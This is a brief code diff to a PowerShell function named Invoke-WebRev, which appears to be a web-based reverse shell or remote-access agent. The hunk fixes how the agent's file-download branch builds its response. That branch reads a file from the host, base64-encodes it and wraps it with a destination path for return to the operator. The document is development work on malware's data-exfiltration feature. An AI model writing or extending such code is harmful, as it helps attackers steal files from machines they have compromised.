@@ -122,7 +122,8 @@ function Invoke-WebRev{
                     {
                         $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                         $b64 = [System.Convert]::ToBase64String($downloadData);
-                        $result = '[+] File successfully downloaded.", ' + '"file":"' + $b64 + '", ' + '"pathDst":"' + $pathDst;
+                        $result = '[+] File successfully downloaded.'
+                        $type = $type + ', "file":"' + $b64 + '", ' + '"pathDst":"' + $pathDst + '"';
                     } 
                     else
                     {
